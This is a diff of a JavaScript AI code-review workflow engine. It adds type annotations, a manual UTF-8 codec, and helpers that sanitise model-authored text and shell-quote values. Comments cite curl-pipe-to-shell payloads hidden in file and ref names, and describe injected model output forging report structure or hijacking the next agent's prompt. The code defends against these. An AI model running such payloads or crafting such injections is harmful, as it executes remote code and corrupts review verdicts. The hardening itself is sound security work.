@@ -945,15 +1080,17 @@ const ANCILLARY_NAMES = new Set([
 
 const ANCILLARY_PATH = /(^|\/)(\.github|\.gitlab|\.circleci|\.woodpecker|\.buildkite)\//i
 
+/** @param {unknown} f */
 function isAncillaryConfig(f) {
   const p = String(f)
-  const base = p.split('/').pop().toLowerCase()
+  const base = /** @type {string} */ (p.split('/').pop()).toLowerCase()
   return ANCILLARY_NAMES.has(base) || ANCILLARY_PATH.test(p) || /\.dockerfile$/i.test(base)
 }
 
 // The files whose absence from the review actually voids a green verdict: material, and not mere
 // project configuration. This — not `materialUncovered` — drives the INCOMPLETE marker on a run
 // that DID review code.
+/** @param {unknown[]} files */
 function coverageGapFiles(files) {
   return materialUncovered(files).filter(f => !isAncillaryConfig(f))
 }
@@ -967,14 +1104,19 @@ function coverageGapFiles(files) {
 //   'review'            — go ahead, with `active`.
 // A pin only takes effect in the last step: it says WHICH profile reviews the material, never that
 // material exists.
+/**
+ * @template {{lang: string}} P
+ * @param {{profiles: Record<string, P>, changedFiles: unknown, detectedActive: unknown, pinnedLangs: unknown}} args
+ * @returns {{outcome: string, active: P[], material: unknown[]}}
+ */
 function resolveCoverage({ profiles, changedFiles, detectedActive, pinnedLangs }) {
-  const files = Array.isArray(changedFiles) ? changedFiles : []
-  const detected = Array.isArray(detectedActive) ? detectedActive : []
+  const files = /** @type {unknown[]} */ (Array.isArray(changedFiles) ? changedFiles : [])
+  const detected = /** @type {P[]} */ (Array.isArray(detectedActive) ? detectedActive : [])
   if (!files.length) return { outcome: 'empty', active: [], material: [] }
   const material = materialUncovered(files)
   if (!material.length && !detected.length) return { outcome: 'nothing-to-review', active: [], material }
   let active = detected
-  if (!active.length && Array.isArray(pinnedLangs) && pinnedLangs.length) active = pinnedLangs.map(id => profiles[id])
+  if (!active.length && Array.isArray(pinnedLangs) && pinnedLangs.length) active = /** @type {string[]} */ (pinnedLangs).map(id => /** @type {P} */ (profiles[id]))
   if (!active.length) return { outcome: 'no-profile', active: [], material }
   return { outcome: 'review', active, material }
 }
@@ -984,10 +1126,12 @@ function resolveCoverage({ profiles, changedFiles, detectedActive, pinnedLangs }
 // statement from "files went unreviewed", and it must not be dressed up as a coverage hole. A
 // marker that fires on every README-only change stops being read, which destroys the value of the
 // marker on the diffs that do hide unreviewed code.
+/** @param {number} fileCount */
 function nothingToReviewMessage(fileCount) {
   return `NOTHING NEEDED REVIEWING — all ${fileCount} changed file(s) are documentation, assets, lockfiles or generated output; none carries reviewable code. No lens ran because none had anything to look at.`
 }
 
+/** @param {unknown[]} material */
 function uncoveredNotRunNote(material) {
   const shown = material.slice(0, 5).join(', ')
   return `${material.length} changed file(s) matched no language profile and were NOT reviewed (${shown}${material.length > 5 ? `, +${material.length - 5} more` : ''})`
@@ -997,6 +1141,7 @@ function uncoveredNotRunNote(material) {
 // or the floor premise was revoked) is INCOMPLETE — re-running helps; a coverage hole (changed files
 // no profile covers) is PARTIAL COVERAGE — a re-run will not fix it. Both mean "not a clean verdict";
 // analyze-runs must treat both as non-clean (see its isIncomplete).
+/** @param {{notRun?: unknown[], coverageNotes?: unknown[], floorPremiseHeld?: boolean}} [opts] */
 function verdictSuffix({ notRun = [], coverageNotes = [], floorPremiseHeld = true } = {}) {
   if (notRun.length || !floorPremiseHeld) return ' (INCOMPLETE)'
   if (coverageNotes.length) return ' (PARTIAL COVERAGE)'
@@ -1023,8 +1168,9 @@ function verdictSuffix({ notRun = [], coverageNotes = [], floorPremiseHeld = tru
 // Each line ends up at the head of a human-facing report, and its text is model-authored (a logger
 // agent quotes back what the script printed). Flattened and bounded so a reply cannot forge report
 // structure — a heading, a verdict line — above the verdict the engine actually computed.
+/** @param {unknown} lost */
 function telemetryLostSection(lost) {
-  const lines = (Array.isArray(lost) ? lost : []).filter(l => String(l ?? '').trim())
+  const lines = /** @type {unknown[]} */ (Array.isArray(lost) ? lost : []).filter(l => String(l ?? '').trim())
   if (!lines.length) return ''
   // A record that LANDED while its run directory did not is a different fact from a record nobody
   // can find, and counting it under "could not be confirmed" is how a banner earns its way onto the
@@ -1110,6 +1256,7 @@ const LEDGER_ITEM = {
   },
 }
 
+/** @type {Schema<PriorRoundAnswer>} */
 const PRIOR_ROUND_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -1130,6 +1277,7 @@ const PRIOR_ROUND_SCHEMA = {
   },
 }
 
+/** @type {Schema<DetectAnswer>} */
 const DETECT_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -1148,6 +1296,7 @@ const DETECT_SCHEMA = {
 // of sizeBucket (RIGOR_BY_SIZE below), so the script derives them instead of asking a haiku to
 // recite a lookup table it could contradict — the same reason the "always" lenses are enforced in
 // code rather than in the prompt.
+/** @type {Schema<ScoutAnswer>} */
 const SCOUT_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -1175,6 +1324,7 @@ const SCOUT_SCHEMA = {
   },
 }
 
+/** @type {Schema<GateAnswer>} */
 const GATE_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -1189,6 +1339,7 @@ const GATE_SCHEMA = {
   },
 }
 
+/** @type {Schema<FindingsAnswer>} */
 const FINDINGS_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -1199,6 +1350,7 @@ const FINDINGS_SCHEMA = {
   },
 }
 
+/** @type {Schema<VerdictAnswer>} */
 const VERDICT_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -1212,6 +1364,7 @@ const VERDICT_SCHEMA = {
   },
 }
 
+/** @type {Schema<CriticAnswer>} */
 const CRITIC_SCHEMA = {
   type: 'object',
   additionalProperties: false,
@@ -1222,10 +1375,12 @@ const CRITIC_SCHEMA = {
   },
 }
 
+/** @type {Schema<ChangedAnswer>} */
 const CHANGED_SCHEMA = {
   type: 'object', additionalProperties: false, required: ['changed', 'reason'],
   properties: { changed: { type: 'boolean' }, reason: { type: 'string' } },
 }
+/** @type {Schema<PrCommentsAnswer>} */
 const PR_COMMENTS_SCHEMA = {
   type: 'object', additionalProperties: false, required: ['posted', 'reason'],
   properties: {
@@ -1233,6 +1388,7 @@ const PR_COMMENTS_SCHEMA = {
     reason: { type: 'string', description: 'the PR posted to, or why nothing was posted' },
   },
 }
+/** @type {Schema<AdjudicateAnswer>} */
 const ADJUDICATE_SCHEMA = {
   type: 'object', additionalProperties: false, required: ['status', 'currentLine', 'note', 'invariant', 'attack'],
   properties: {
@@ -1250,6 +1406,7 @@ const ADJUDICATE_SCHEMA = {
 // track (the same safe direction a DEAD adjudicator already takes) and annotates `why`, so the
 // report shows the item as unverified rather than silently fixed. See adjudicateOne.
 // Red-team verdict on a "resolved" Critical/High prior: an independent attempt to defeat the fix.
+/** @type {Schema<AttackAnswer>} */
 const ATTACK_SCHEMA = {
   type: 'object', additionalProperties: false, required: ['defeated', 'attack'],
   properties: {
@@ -1267,9 +1424,11 @@ const ATTACK_SCHEMA = {
 const CRAFT_VERSION = '0.22.0' // x-release-please-version
 // Severity ordering, worst first. Lives in the declarations prefix (not next to its first use in
 // dedupPool) so severity-ranking helpers stay unit-testable — the test harness evals this prefix.
+/** @type {Record<string, number>} */
 const SEV_RANK = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 }
 // One-notch severity demotion (test-only reachability). In the declarations prefix alongside
 // SEV_RANK so the severity helpers stay unit-testable.
+/** @type {Record<string, string>} */
 const DEMOTE = { Critical: 'High', High: 'Medium', Medium: 'Low', Low: 'Info', Info: 'Info' }
 // ---- adjudicate-track pure helpers ----
 // These live in lib/review-adjudicate.mjs — a real, linted module with real unit tests that IMPORT
@@ -1285,6 +1444,10 @@ const ATTACK_MAX = 500
 // Model "attack"/"note" text is persisted into the ledger `why`, re-interpolated into next-round
 // prompts, and rendered in the report — cap it and strip newline/markdown structure so runaway or
 // injected output cannot restyle the report or compound across re-review rounds.
+/**
+ * @param {unknown} text
+ * @returns {string}
+ */
 function sanitizeAttack(text) {
   // Also break the baseWhy marker DELIMITER: collapse the ` — ` that precedes a `fix incomplete` /
   // `REGRESSED after fix` / `UNVERIFIED` / `still-open` marker word to a plain space, and likewise
@@ -1315,13 +1478,19 @@ function sanitizeAttack(text) {
 // so the ONLY markers in `why` are the real per-round appends plus any in the original (unsanitized)
 // rationale. The LAST-marker split then both PREVENTS accretion (each round strips the prior append
 // before re-appending — `why` is stable round-over-round) AND preserves a rationale that quotes a marker.
+/**
+ * @param {unknown} why
+ * @returns {string}
+ */
 function baseWhy(why) {
   const s = String(why ?? '').replace(/ \(reopened: [^)]*\)\s*$/, '')
     .replace(/ — still-open \(adjudicator did not run[^)]*\)\s*$/, '')
     .replace(/ — REGRESSED after fix \(no detail[^)]*\)\s*$/, '')
     .replace(/ — UNVERIFIED \(adjudicator could not tell[^)]*\)\s*$/, '')
   const re = / — (?:fix incomplete(?: \([^)]*\))?|REGRESSED after fix|UNVERIFIED \(adjudicator could not tell\)): /g
-  let last = -1, m
+  let last = -1
+  /** @type {RegExpExecArray | null} */
+  let m
   while ((m = re.exec(s))) last = m.index
   return last === -1 ? s : s.slice(0, last)
 }
@@ -1330,10 +1499,21 @@ function baseWhy(why) {
 // would fail the whole prior-round ledger load and silently degrade re-review to a first pass), so a
 // drifted `critical`/`CRITICAL` value must still trip the red-team gate. Exact-match `=== 'Critical'`
 // would silently skip red-team on such a prior.
+/**
+ * @param {unknown} sev
+ * @returns {boolean}
+ */
 function isHighSeverity(sev) { return ['critical', 'high'].includes(String(sev ?? '').trim().toLowerCase()) }
 
 // Pure red-team verdict handling for a "resolved" Critical/High prior. Returns the possibly-
 // adjusted adjudication plus degradation flags; the caller does the logging/counting.
+/**
+ * @template {Verdict} V
+ * @param {Finding} f
+ * @param {V} adj
+ * @param {Verdict | null | undefined} rt
+ * @returns {{ adj: V, died: boolean, overturned: boolean, invalid: boolean }}
+ */
 function classifyRedTeam(f, adj, rt) {
   if (!isHighSeverity(f.severity)) return { adj, died: false, overturned: false, invalid: false }
   if (rt == null) return { adj: { ...adj, note: `${adj.note || ''} [red-team did not run — agent died; resolved on the adjudicator's attack pass alone]`.trim() }, died: true, overturned: false, invalid: false }
@@ -1345,6 +1525,13 @@ function classifyRedTeam(f, adj, rt) {
 
 // Pure per-finding dispatch: map a finding + its adjudication result (r may be null) to a track
 // and a ledger-ready entry. Caller pushes entry onto adjudicated[track] and does logging.
+/**
+ * `entry` is `f` re-stamped (line, why, disposition, note), so it is returned as the caller's own type.
+ * @template {Finding} F
+ * @param {F} f
+ * @param {Verdict | null | undefined} r
+ * @returns {{ track: 'stillOpen' | 'resolved' | 'regressed', entry: F & { line?: unknown, note?: string, disposition?: string }, adjudicatorDied?: boolean, demoted?: boolean, cannotTell?: boolean }}
+ */
 function adjudicateOne(f, r) {
   const located = { ...f, line: r?.currentLine || f.line }
   const attack = sanitizeAttack(r?.attack)
@@ -1370,6 +1557,10 @@ function adjudicateOne(f, r) {
 // wastes an opus call and lets the red-team overwrite the adjudicator's own attack. Only a genuinely
 // clean resolved (no attack) gets red-teamed. Emptiness is judged on the SANITIZED attack so a
 // markdown-only "attack" counts as none.
+/**
+ * @param {Verdict | null | undefined} r
+ * @returns {boolean}
+ */
 function shouldRedTeam(r) {
   return r?.status === 'resolved' && !sanitizeAttack(r.attack)
 }
@@ -1377,6 +1568,10 @@ function shouldRedTeam(r) {
 // The coarse identity used to decide whether a lens finding is ALREADY on the adjudicate track:
 // file + ruleId, case- and whitespace-normalised. Empty when either half is missing — a finding
 // with no ruleId cannot be keyed this way, and the caller falls back to the exact matcher.
+/**
+ * @param {Finding | null | undefined} f
+ * @returns {string}
+ */
 function carriedKey(f) {
   const file = String(f?.file ?? '').trim().toLowerCase()
   const ruleId = String(f?.ruleId ?? '').trim().toLowerCase()
@@ -1424,6 +1619,14 @@ function carriedKey(f) {
 // reaches the next ledger is preferred over one that is leaving it (partitionAbsorbed would
 // otherwise keep the finding at a retired host that a live host could have absorbed). That
 // preference is positional, not enforced here; a caller reordering that array changes it.
+/**
+ * @template {Finding} F
+ * @template {Finding} P
+ * @param {F} f
+ * @param {P[] | null | undefined} priors
+ * @param {FallbackMatch<F, P>} [fallbackMatch]
+ * @returns {P | null}
+ */
 function findCarrier(f, priors, fallbackMatch) {
   const key = carriedKey(f)
   return (priors || []).find(p => {
@@ -1434,6 +1637,14 @@ function findCarrier(f, priors, fallbackMatch) {
 }
 
 // True when `f` (a finding the lenses just discovered) is already tracked by one of `priors`.
+/**
+ * @template {Finding} F
+ * @template {Finding} P
+ * @param {F} f
+ * @param {P[] | null | undefined} priors
+ * @param {FallbackMatch<F, P>} [fallbackMatch]
+ * @returns {boolean}
+ */
 function alreadyCarried(f, priors, fallbackMatch) {
   return !!findCarrier(f, priors, fallbackMatch)
 }
@@ -1458,11 +1669,21 @@ const ABSORB_TITLE_MAX = 160
 
 // sanitizeAttack, then a tighter cap. Shares the sanitiser so the marker-collapsing (and therefore
 // the forgery defence) applies to every part of a clause.
+/**
+ * @param {unknown} text
+ * @param {number} max
+ * @returns {string}
+ */
 function clampField(text, max) {
   const s = sanitizeAttack(text)
   return s.length > max ? `${s.slice(0, max)}…` : s
 }
 
+/**
+ * @param {unknown} baseText
+ * @param {Finding | null | undefined} f
+ * @returns {string}
+ */
 function noteAbsorbed(baseText, f) {
   const base = String(baseText ?? '')
   const mark = ' — also reported at '
@@ -1478,6 +1699,11 @@ function noteAbsorbed(baseText, f) {
 // TRAILING marker), so the base can be extended and this round's marker suffix re-attached
 // unchanged — which is what keeps the clause alive across rounds: next round's baseWhy strips the
 // marker and keeps everything the clause sits in.
+/**
+ * @param {unknown} hostWhy
+ * @param {Finding | null | undefined} f
+ * @returns {string}
+ */
 function absorbInto(hostWhy, f) {
   const s = String(hostWhy ?? '')
   const base = baseWhy(s)
@@ -1498,6 +1724,10 @@ function absorbInto(hostWhy, f) {
 // as a real absorbed report. It needs the exact em-dash phrasing, so it is unlikely — but it is not
 // prevented, and the delimiter is textual, so no amount of sanitising downstream can prevent it.
 // (This is the same honesty baseWhy's own comment keeps about a rationale that QUOTES a marker.)
+/**
+ * @param {unknown} why
+ * @returns {{ base: string, sites: string[], more: number }}
+ */
 function splitAbsorbed(why) {
   const overflow = / — \(\+(\d+) more report\(s\) at this site\)/
   let head = baseWhy(why)
@@ -1505,13 +1735,17 @@ function splitAbsorbed(why) {
   const more = m ? Number(m[1]) : 0
   if (m) head = head.replace(overflow, '')
   const parts = head.split(' — also reported at ')
-  return { base: parts[0], sites: parts.slice(1).map(s => s.trim()).filter(Boolean), more }
+  return { base: /** @type {string} */ (parts[0]), sites: parts.slice(1).map(s => s.trim()).filter(Boolean), more }
 }
 
 // The `why` as it should be interpolated into a prompt: the rationale plus this round's marker
 // suffix, with the absorbed clauses removed — they are delivered separately (absorbedPromptBlock)
 // because this field is passed through sanitizeAttack's ATTACK_MAX cap and a trailing clause on a
 // paragraph-length rationale is simply cut off.
+/**
+ * @param {unknown} why
+ * @returns {string}
+ */
 function withoutAbsorbed(why) {
   const s = String(why ?? '')
   return splitAbsorbed(s).base + s.slice(baseWhy(s).length)
@@ -1521,6 +1755,10 @@ function withoutAbsorbed(why) {
 // capped `why` field, one site per line, and — the half a bare list leaves out — a sentence saying
 // what their presence means for the verdict. Empty string when nothing was absorbed, so the caller
 // can interpolate it unconditionally.
+/**
+ * @param {unknown} why
+ * @returns {string}
+ */
 function absorbedPromptBlock(why) {
   const { sites, more } = splitAbsorbed(why)
   if (!sites.length && !more) return ''
@@ -1543,9 +1781,23 @@ function absorbedPromptBlock(why) {
 // `seed` carries absorptions ALREADY decided for these same hosts by an earlier call (see
 // absorbAcross): the returned `updates` is cumulative, seeded entries included, and a host present
 // in it extends THAT text rather than its own un-absorbed `why`.
+/**
+ * @template {Finding} F
+ * @template {Finding} P
+ * @param {F[] | null | undefined} findings
+ * @param {P[] | null | undefined} livePriors
+ * @param {RetiredSet<P>} retired
+ * @param {FallbackMatch<F, P>} [fallbackMatch]
+ * @param {Iterable<[P, string]> | null | undefined} [seed]
+ * @returns {Partition<F, P>}
+ */
 function partitionAbsorbed(findings, livePriors, retired, fallbackMatch, seed) {
+  /** @param {P} h */
   const isRetired = h => (retired instanceof Set ? retired.has(h) : !!(retired || []).includes(h))
-  const kept = [], updates = new Map(seed || [])
+  /** @type {F[]} */
+  const kept = []
+  /** @type {Map<P, string>} */
+  const updates = new Map(seed || [])
   let absorbed = 0, keptAtRetired = 0
   for (const f of findings || []) {
     const host = findCarrier(f, livePriors, fallbackMatch)
@@ -1569,8 +1821,19 @@ function partitionAbsorbed(findings, livePriors, retired, fallbackMatch, seed) {
 // through the seed, so the clauses accumulate.
 //
 // Pure, like partitionAbsorbed: hosts are not mutated. The caller applies `updates` once.
+/**
+ * @template {Finding} F
+ * @template {Finding} P
+ * @param {(F[] | null | undefined)[] | null | undefined} lists
+ * @param {P[] | null | undefined} livePriors
+ * @param {RetiredSet<P>} retired
+ * @param {FallbackMatch<F, P>} [fallbackMatch]
+ * @returns {{ runs: Partition<F, P>[], updates: Map<P, string>, absorbed: number, keptAtRetired: number }}
+ */
 function absorbAcross(lists, livePriors, retired, fallbackMatch) {
+  /** @type {Partition<F, P>[]} */
   const runs = []
+  /** @type {Map<P, string>} */
   let updates = new Map()
   for (const list of lists || []) {
     const r = partitionAbsorbed(list, livePriors, retired, fallbackMatch, updates)
@@ -1652,7 +1915,17 @@ const TRACKED_MARK = ' — (this site is already tracked by a still-live prior f
 // win the preference would leave the finding neither collapsed nor even marked.
 //
 // Pure: returns new finding objects and an `updates` map; neither the findings nor the hosts are mutated.
+/**
+ * @template {Finding} F
+ * @template {Finding} P
+ * @param {F[] | null | undefined} findings
+ * @param {P[] | null | undefined} livePriors
+ * @param {RetiredSet<P>} retired
+ * @param {FallbackMatch<F, P>} [fallbackMatch]
+ * @returns {{ kept: Array<F & { ledgerDupOfUnverifiedPrior?: boolean }>, marked: number, collapsed: number, updates: Map<P, string> }}
+ */
 function markTrackedUnverified(findings, livePriors, retired, fallbackMatch) {
+  /** @param {P} h */
   const isRetired = h => (retired instanceof Set ? retired.has(h) : !!(retired || []).includes(h))
   // A retired prior is no host here, so it is removed from the search rather than tested after it:
   // left in, it SHADOWS a live host at the same file+ruleId (`.find` takes the earliest) and the
@@ -1663,6 +1936,7 @@ function markTrackedUnverified(findings, livePriors, retired, fallbackMatch) {
   const unverifiedHosts = hosts.filter(h => String(h?.tier ?? '') === 'unverified')
   let marked = 0
   let collapsed = 0
+  /** @type {Map<P, string>} */
   const updates = new Map()
   const kept = (findings || []).map(f => {
     const host = findCarrier(f, unverifiedHosts, fallbackMatch) || findCarrier(f, hosts, fallbackMatch)
@@ -1693,17 +1967,19 @@ function markTrackedUnverified(findings, livePriors, retired, fallbackMatch) {
 // NOT make it shell-safe: it only escapes `"`/`\`/control chars, and inside a double-quoted shell
 // context `$(...)`, backtick and `$VAR` still expand, so a file literally named `$(curl evil.sh|sh)`
 // would execute when the carry agent runs the command. shq() single-quotes it, disabling all expansion.
+/** @param {unknown} v */
 function flattenField(v) { return String(v ?? '').replace(/[\r\n]+/g, ' ').trim().slice(0, ATTACK_MAX) }
+/** @param {Finding} f */
 function promptFields(f) {
   return {
-    title: flattenField(f.title),
-    symbol: flattenField(f.symbol) || '?',
-    ruleId: flattenField(f.ruleId) || '—',
-    file: flattenField(f.file),
-    severity: flattenField(f.severity),
+    title: flattenField(f['title']),
+    symbol: flattenField(f['symbol']) || '?',
+    ruleId: flattenField(f['ruleId']) || '—',
+    file: flattenField(f['file']),
+    severity: flattenField(f['severity']),
     // A locator field like file/symbol: paths and identifiers are load-bearing (the verifier is
     // told to OPEN it), so flatten newlines but keep `_ < > [ ]` intact — see flattenField.
-    whereChecked: flattenField(f.whereChecked),
+    whereChecked: flattenField(f['whereChecked']),
   }
 }
 // POSIX single-quote shell-escaper for a model-authored value that lands in a shell command a
@@ -1718,12 +1994,14 @@ function promptFields(f) {
 // lib/run-logging.mjs in the other three engines and is blind to it here. A hardening that lands on
 // the source therefore regenerates into three engines and silently skips the fourth, which is the
 // only one passing model-authored `repo`/`runDir` through it. Change one, change this by hand.
+/** @param {unknown} s */
 function shq(s) { return `'${String(s ?? '').replace(/'/g, `'\\''`)}'` }
 // A conservative "is this a safe commit-ish?" gate for a model-authored ledger `head` before it is
 // interpolated into a shell command. Accept a git SHA (7–40 hex) or a ref name drawn only from
 // shell-inert characters (alnum plus `._/-`, no spaces/metacharacters). A crafted `HEAD $(curl evil|sh)`
 // fails — it carries a space and `$()`. Used at the prior-round LOAD boundary to fall back to a safe
 // default without disabling re-review; the use sites additionally shq()/flattenField() it (defense in depth).
+/** @param {unknown} s */
 function isCommitish(s) {
   const v = String(s ?? '').trim()
   if (!v) return false
@@ -1739,8 +2017,10 @@ function isCommitish(s) {
 // silently bucket it as 0 Critical/0 High — a fail-open that clears a still-broken Critical fix.
 // Mapping known values to canonical case here (and passing an unknown value through, trimmed — never
 // dropping it) means EVERY downstream comparison sees canonical severity for priors.
+/** @type {Record<string, string>} */
 const CANON_SEVERITY = { critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low', info: 'Info' }
 
+/** @param {unknown} sev */
 function canonicalSeverity(sev) { return CANON_SEVERITY[String(sev ?? '').trim().toLowerCase()] || String(sev ?? '').trim() }
 
 // ---- The ALREADY-FOUND block of a lens prompt ----
@@ -1787,15 +2067,22 @@ const PRIOR_SUMMARY_MAX_CHARS = 3000
 
 const PRIOR_SUMMARY_TITLE_MAX = 120
 
+/**
+ * @typedef {{file?: unknown, line?: unknown, title?: unknown, severity?: unknown} | null | undefined} PriorFinding
+ * @param {unknown} pool
+ * @param {{maxChars?: number, titleMax?: number}} [opts]
+ */
 function priorFoundSummary(pool, { maxChars = PRIOR_SUMMARY_MAX_CHARS, titleMax = PRIOR_SUMMARY_TITLE_MAX } = {}) {
-  const items = Array.isArray(pool) ? pool : []
+  const items = /** @type {PriorFinding[]} */ (Array.isArray(pool) ? pool : [])
   if (!items.length) return 'none yet'
   // Local, not a module const: this function is pasted into workflows/review.js by the craft-inline
   // gate, which copies only the symbols its fence header names — a helper const outside the body
   // would arrive there undefined.
+  /** @type {Record<string, number>} */
   const rank = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 }
   // Model-authored titles land in a prompt here: a newline in one would forge extra ALREADY-FOUND
   // rows, so flatten before clamping (same reason flattenField exists on the verify track).
+  /** @param {PriorFinding} f */
   const line = f => `${String(f?.file ?? '').replace(/[\r\n]+/g, ' ').trim() || '?'}:${f?.line || 0} ${String(f?.title ?? '').replace(/[\r\n]+/g, ' ').trim().slice(0, titleMax)}`.trimEnd()
   const ordered = items
     .map((f, i) => ({ f, i }))
@@ -1822,8 +2109,9 @@ function priorFoundSummary(pool, { maxChars = PRIOR_SUMMARY_MAX_CHARS, titleMax 
 // The invariant string interpolated into the red-team prompt is model-authored (from the
 // adjudicator's own verdict, falling back to the finding `why`). Route it through sanitizeAttack
 // so runaway/injected structure cannot restyle or hijack the next agent's prompt.
+/** @param {{ invariant?: unknown }} adj @param {Finding} f */
 function redTeamInvariant(adj, f) {
-  return sanitizeAttack(adj.invariant) || sanitizeAttack(f.why)
+  return sanitizeAttack(adj.invariant) || sanitizeAttack(f['why'])
 }
 
 
@@ -1874,6 +2162,11 @@ const DEATH_WINDOW_DISPATCHES = 6
 
 const DEATHS_IN_WINDOW_TO_OPEN = 3
 
+/**
+ * @param {unknown} value
+ * @param {number} fallback
+ * @returns {number}
+ */
 function positiveInt(value, fallback) {
   const n = Math.floor(Number(value))
   return Number.isFinite(n) && n >= 1 ? n : fallback
@@ -1884,11 +2177,14 @@ function positiveInt(value, fallback) {
 // — a per-agent view would see one death each and never see the outage at all. It is an INSTANCE,
 // not a module-level variable: a pass gets its own, so a window left half-full by one profile's
 // verification cannot decide anything for the next profile's, whose reachability it never observed.
+/** @param {{ window?: number, toOpen?: number }} [opts] */
 function makeDeathBreaker(opts = {}) {
   const windowLen = positiveInt(opts.window, DEATH_WINDOW_DISPATCHES)
   const toOpen = Math.min(windowLen, positiveInt(opts.toOpen, Math.min(windowLen, DEATHS_IN_WINDOW_TO_OPEN)))
   // The last `windowLen` observed outcomes, oldest first; true = the dispatch returned nothing.
+  /** @type {boolean[]} */
   const recent = []
+  /** @param {boolean} isDeath */
   const observe = isDeath => {
     recent.push(isDeath)
     while (recent.length > windowLen) recent.shift()
@@ -1934,7 +2230,60 @@ function makeDeathBreaker(opts = {}) {
 // Pure helper, tested as a real module in lib/lens-scope.mjs and pasted back here by the
 // craft-inline gate. The measurement that motivates it — lenses at 73.6% of a run, the whole diff
 // pulled by every lens on every round — lives there, with the risk it does not solve.
-// >>> craft-inline lib/lens-scope.mjs decodeGitPath MAX_SHARED_PER_SLICE SHARED_SUFFIXES GROUP_DEPTH isShared groupKey splitDeep commonPrefixLength mergedKey uniqueKey sliceDiff sliceableLens WHOLE_DIFF_LENSES LENS_WINDOW_AGENTS pathspecLiteral
+// >>> craft-inline lib/lens-scope.mjs utf8Bytes utf8Text decodeGitPath MAX_SHARED_PER_SLICE SHARED_SUFFIXES GROUP_DEPTH isShared groupKey splitDeep commonPrefixLength mergedKey uniqueKey sliceDiff sliceableLens WHOLE_DIFF_LENSES LENS_WINDOW_AGENTS pathspecLiteral
+// UTF-8 by hand. The Workflow sandbox has no TextEncoder or TextDecoder — a probe workflow saw both
+// undefined (realm @nick/craft, #135) — and decodeGitPath runs there, inlined into review.js. These
+// follow the platform objects: a lone surrogate encodes as U+FFFD, and decoding replaces each maximal
+// invalid subpart with U+FFFD as the WHATWG UTF-8 decoder does (pinned against TextDecoder by a
+// differential test). One deliberate difference: a leading BOM is kept, as `ignoreBOM: true` keeps it —
+// a path is not a document, and a file whose name starts with U+FEFF must decode to that name.
+/** @param {string} text @returns {number[]} */
+function utf8Bytes(text) {
+  /** @type {number[]} */
+  const out = []
+  for (const ch of text) {
+    let cp = /** @type {number} */ (ch.codePointAt(0))
+    if (cp >= 0xd800 && cp <= 0xdfff) cp = 0xfffd
+    if (cp < 0x80) out.push(cp)
+    else if (cp < 0x800) out.push(0xc0 | (cp >> 6), 0x80 | (cp & 0x3f))
+    else if (cp < 0x10000) out.push(0xe0 | (cp >> 12), 0x80 | ((cp >> 6) & 0x3f), 0x80 | (cp & 0x3f))
+    else out.push(0xf0 | (cp >> 18), 0x80 | ((cp >> 12) & 0x3f), 0x80 | ((cp >> 6) & 0x3f), 0x80 | (cp & 0x3f))
+  }
+  return out
+}
+
+/** @param {number[]} bytes @returns {string} */
+function utf8Text(bytes) {
+  let out = ''
+  let cp = 0, need = 0, seen = 0, lower = 0x80, upper = 0xbf
+  let i = 0
+  while (i < bytes.length) {
+    const b = /** @type {number} */ (bytes[i])
+    if (need === 0) {
+      if (b <= 0x7f) out += String.fromCharCode(b)
+      else if (b >= 0xc2 && b <= 0xdf) { need = 1; cp = b & 0x1f }
+      else if (b >= 0xe0 && b <= 0xef) { if (b === 0xe0) lower = 0xa0; if (b === 0xed) upper = 0x9f; need = 2; cp = b & 0x0f }
+      else if (b >= 0xf0 && b <= 0xf4) { if (b === 0xf0) lower = 0x90; if (b === 0xf4) upper = 0x8f; need = 3; cp = b & 0x07 }
+      else out += '\ufffd'
+      i++
+      continue
+    }
+    if (b < lower || b > upper) {
+      // The sequence so far is one replacement; this byte is read again as a fresh start.
+      cp = need = seen = 0; lower = 0x80; upper = 0xbf
+      out += '\ufffd'
+      continue
+    }
+    lower = 0x80; upper = 0xbf
+    cp = (cp << 6) | (b & 0x3f)
+    seen++
+    i++
+    if (seen === need) { out += String.fromCodePoint(cp); cp = need = seen = 0 }
+  }
+  if (need !== 0) out += '\ufffd'
+  return out
+}
+
 // A path as a LITERAL git pathspec. Shell-quoting alone is not enough and the gap is silent: git
 // reads a pathspec as wildmatch, so a real file named `f[1].rs` does not match itself; a leading `:`
 // is read as pathspec magic; and `git diff --name-only` C-quotes paths holding spaces or non-ASCII,
@@ -1942,6 +2291,7 @@ function makeDeathBreaker(opts = {}) {
 // Every one of those hands the lens a SMALLER diff than it believes it has, with no error — the
 // file is simply never reviewed. That risk arrives with slicing, because the file list stops being
 // advisory (the glob covered everything) and becomes the authoritative scope.
+/** @param {unknown} file */
 function decodeGitPath(file) {
   const raw = String(file ?? '')
   if (!(raw.length > 1 && raw.startsWith('"') && raw.endsWith('"'))) return raw
@@ -1957,16 +2307,17 @@ function decodeGitPath(file) {
   // anything outside the BMP, and encoding half a pair yields U+FFFD twice — so an emoji became
   // `\uFFFD\uFFFD` and the name matched nothing.
   const body = [...raw.slice(1, -1)]
-  const enc = new TextEncoder()
+  /** @type {Record<string, number>} */
   const SIMPLE = { a: 7, b: 8, t: 9, n: 10, v: 11, f: 12, r: 13, '"': 34, '\\': 92 }
+  /** @type {number[]} */
   const bytes = []
   for (let i = 0; i < body.length; i++) {
-    if (body[i] !== '\\') { bytes.push(...enc.encode(body[i])); continue }
+    if (body[i] !== '\\') { bytes.push(...utf8Bytes(/** @type {string} */ (body[i]))); continue }
     const c = body[i + 1]
     // A TRAILING backslash is not an escape at all; keep it, rather than consuming the character
     // after the end of the string and pushing a NUL into the path.
-    if (c === undefined) { bytes.push(...enc.encode('\\')); continue }
-    if (Object.prototype.hasOwnProperty.call(SIMPLE, c)) { bytes.push(SIMPLE[c]); i++; continue }
+    if (c === undefined) { bytes.push(...utf8Bytes('\\')); continue }
+    if (Object.prototype.hasOwnProperty.call(SIMPLE, c)) { bytes.push(/** @type {number} */ (SIMPLE[c])); i++; continue }
     // Octal, always three digits as git emits them. A two-digit tail is NOT one, and swallowing the
     // backslash there turned `a\30.rs` into `a30.rs` — again a valid name for other code.
